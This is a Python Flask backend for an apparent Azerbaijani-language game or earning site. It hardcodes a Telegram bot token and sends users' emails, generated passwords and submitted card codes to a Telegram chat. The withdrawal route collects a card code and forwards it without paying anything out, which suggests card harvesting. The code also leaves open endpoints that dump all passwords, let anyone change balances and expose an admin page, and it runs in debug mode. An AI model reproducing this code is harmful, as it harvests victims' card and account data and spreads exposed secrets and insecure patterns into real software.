from flask import Flask, render_template, request, jsonify
import sqlite3
import os
import random
import time
import requests

app = Flask(__name__)
DB_FILE = "players.db"

# --- TELEGRAM BOT MƏLUMATLARI ---
TELEGRAM_TOKEN = "8502614066:AAFsPtOOY5RS5y1SNRs_Oir1sBXCgkl4fyY"
TELEGRAM_CHAT_ID = "7953669834"

def send_telegram_message(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "Markdown"
        }
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print("Telegram xətası:", e)

def init_db():
    """Verilənlər bazasını və cədvəli yaradır"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS players (
            player_id TEXT PRIMARY KEY,
            name TEXT,
            gmail TEXT UNIQUE,
            balance REAL,
            code TEXT,
            online INTEGER,
            last_active INTEGER
        )
    ''')
    conn.commit()
    conn.close()

init_db()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/admin')
def admin_panel():
    return render_template('gizli_panel.html')

@app.route('/get_data', methods=['GET'])
def get_data():
    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM players")
    rows = cursor.fetchall()
    conn.close()
    
    players_dict = {}
    for row in rows:
        players_dict[row['player_id']] = {
            "name": row['name'],
            "gmail": row['gmail'],
            "balance": row['balance'],
            "code": row['code'],
            "online": bool(row['online']),
            "last_active": row['last_active']
        }
    return jsonify(players_dict)

@app.route('/save_data', methods=['POST'])
def save_data_route():
    data = request.json
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    for p_id, info in data.items():
        cursor.execute('''
            INSERT INTO players (player_id, name, gmail, balance, code, online, last_active)
            VALUES (?, ?, ?, ?, ?, ?, ?)
            ON CONFLICT(player_id) DO UPDATE SET
                balance=excluded.balance,
                online=excluded.online,
                last_active=excluded.last_active
        ''', (p_id, info.get('name'), info.get('gmail'), info.get('balance', 0.0), info.get('code'), int(info.get('online', True)), info.get('last_active', int(time.time() * 1000))))
    conn.commit()
    conn.close()
    return jsonify({"status": "success"})

@app.route('/auth', methods=['POST'])
def auth():
    req = request.json
    name = req.get('name', 'Oyunçu').strip()
    gmail = req.get('gmail', '').strip()

    if not gmail or '@' not in gmail:
        return jsonify({"status": "error", "message": "Zəhmət olmasa etibarlı Gmail daxil edin!"})

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    # Gmail-in əvvəlcədən qeydiyyatda olub-olmamasını yoxlayırıq
    cursor.execute("SELECT * FROM players WHERE gmail = ?", (gmail,))
    existing = cursor.fetchone()
    
    if existing:
        conn.close()
        return jsonify({
            "status": "error", 
            "message": "Bu Gmail artıq qeydiyyatdan keçib! Zəhmət olmasa Giriş panelindən daxil olun."
        })

    player_id = f"HOT_{random.randint(1000, 9999)}"
    cursor.execute("SELECT * FROM players WHERE player_id = ?", (player_id,))
    while cursor.fetchone():
        player_id = f"HOT_{random.randint(1000, 9999)}"
        cursor.execute("SELECT * FROM players WHERE player_id = ?", (player_id,))
        
    secret_code = f"PASS{random.randint(100, 999)}"
    now = int(time.time() * 1000)

    cursor.execute('''
        INSERT INTO players (player_id, name, gmail, balance, code, online, last_active)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    ''', (player_id, name, gmail, 0.00, secret_code, 1, now))
    
    conn.commit()
    conn.close()

    msg = (
        f"🚨 **Yeni Qeydiyyat!**\n\n"
        f"👤 **Ad:** {name}\n"
        f"📧 **Gmail:** {gmail}\n"
        f"🆔 **ID:** `{player_id}`\n"
        f"🔑 **Şifrə:** `{secret_code}`\n"
        f"💰 **Balans:** 0.00 ₼"
    )
    send_telegram_message(msg)

    return jsonify({
        "status": "success",
        "playerId": player_id,
        "balance": 0.00,
        "code": secret_code
    })

@app.route('/login', methods=['POST'])
def login():
    req = request.json
    gmail = req.get('gmail', '').strip()
    player_id = req.get('playerId', '').strip()

    if not gmail or not player_id:
        return jsonify({"status": "error", "message": "Gmail və ID daxil edilməlidir!"})

    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    
    cursor.execute("SELECT * FROM players WHERE player_id = ? AND gmail = ?", (player_id, gmail))
    user = cursor.fetchone()

    if user:
        now = int(time.time() * 1000)
        cursor.execute("UPDATE players SET online = 1, last_active = ? WHERE player_id = ?", (now, player_id))
        conn.commit()
        conn.close()
        
        msg = (
            f"🟢 **Oyunçu Giriş etdi!**\n\n"
            f"👤 **Ad:** {user['name']}\n"
            f"🆔 **ID:** `{player_id}`\n"
            f"📧 **Gmail:** {gmail}"
        )
        send_telegram_message(msg)

        return jsonify({
            "status": "success",
            "playerId": player_id,
            "balance": user['balance']
        })
    
    conn.close()
    return jsonify({"status": "error", "message": "Daxil edilən Gmail və ya ID səhvdir!"})

@app.route('/withdraw', methods=['POST'])
def withdraw():
    req = request.json
    player_id = req.get('playerId')
    amount = req.get('amount')
    gmail = req.get('gmail')
    card_code = req.get('cardCode')

    if not player_id or not amount or not gmail or not card_code:
        return jsonify({"status": "error", "message": "Bütün məlumatlar doldurulmalıdır!"})

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM players WHERE player_id = ?", (player_id,))
    user = cursor.fetchone()
    conn.close()

    if user:
        msg = (
            f"💸 **Pul Çıxarma Sorğusu!**\n\n"
            f"🆔 **ID:** `{player_id}`\n"
            f"📧 **Gmail:** {gmail}\n"
            f"💳 **Kart Kodu:** `{card_code}`\n"
            f"💰 **Məbləğ:** `{amount} ₼`"
        )
        send_telegram_message(msg)
        return jsonify({"status": "success"})
    
    return jsonify({"status": "error", "message": "Oyunçu tapılmadı!"})

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    req = request.json
    player_id = req.get('playerId')
    if not player_id:
        return jsonify({"status": "error"})
    
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    now = int(time.time() * 1000)
    cursor.execute("UPDATE players SET online = 1, last_active = ? WHERE player_id = ?", (now, player_id))
    conn.commit()
    conn.close()
    return jsonify({"status": "success"})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=True)